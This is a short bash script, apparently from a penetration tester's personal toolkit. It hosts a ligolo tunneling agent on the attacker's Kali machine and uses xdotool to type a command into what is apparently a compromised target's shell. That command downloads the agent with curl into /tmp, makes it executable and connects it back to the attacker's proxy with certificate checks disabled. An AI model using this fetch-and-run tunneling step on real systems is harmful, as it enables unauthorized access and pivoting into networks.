#!/bin/bash

: '
download ligolo agent to server and connect to proxy
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd ~/Desktop/base/code/xdotool/scripts/portListening/.files
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "curl http://${KALI_IP}:1337/agent -o /tmp/agent && chmod +x /tmp/agent && cd /tmp && ls -alF /tmp && /tmp/agent -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
sleep 10

kill $HTTP_PID